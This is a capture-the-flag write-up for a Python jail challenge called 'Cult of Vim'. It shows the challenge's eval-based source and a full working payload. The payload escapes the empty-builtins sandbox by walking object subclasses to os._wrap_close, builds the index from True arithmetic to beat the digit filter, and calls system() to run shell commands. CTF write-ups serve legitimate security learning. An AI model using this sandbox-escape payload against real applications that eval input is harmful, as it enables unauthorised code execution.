Title: Cult of Vim

Description:
```
I thought exiting Vim was hard enough... now I can't even exit Python??

Your goal is to get a shell, good luck!

nc alpha.8059blank.ml 7002
nc beta.8059blank.ml 7002

Author: Lucas
```

Given files: [vim.py](https://github.com/Coder-Here/HACK-AC-2022-CTF/blob/main/Misc/Cult%20of%20Vim/vim.py "vim.py")

Given hints: Dictionary comprehension might help with the number blacklist

vim.py:

```python
print("You can't even exit()... hehehe...")

filter = '0123456789'
while True:
    print('>', end=' ')
    inp = input()
    if any([True for l in inp if l in filter]):
        print('no')
        continue
    try:
        print(eval(inp, {'__builtins__': {}}))
    except Exception as e:
        print(e)
```

This is similar to the Church of Emacs challenge, but \_\_builtins__ cannot be used, so \_\_import__ cannot be used also. Also, numbers are also removed. In the hint, we can use dictionary comprehension to bypass the number filter, but I got a better method, ```True = 1``` in python, so we can just use 'True' to replace numbers.

Some websites that helped me:

[Explanation on how to use eval() vulnerability](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)

[Explanation on how to use os.\_wrap_close exploit](https://blog.p6.is/Python-SSTI-exploitable-classes/#Using-os-wrap-close)

My main payload was this:

```''.__class__.mro()[True].__subclasses__()[(True+True)*(True+True)*(True+True)*(True+True)*(True+True)*(True+True+True+True)+(True+True)*(True+True)*(True+True)*(True)+True].__init__.__globals__['system']('<SHELL COMMAND>')```

So first I did 'ls' to list all files in the directory, and then I used 'cat' to get the flag.

![image](https://user-images.githubusercontent.com/63996033/199573466-4480136a-ff7d-49b3-a44d-35eaa2faca4e.png)

We got our flag.

Flag: ACSI{:q_was_easier...}
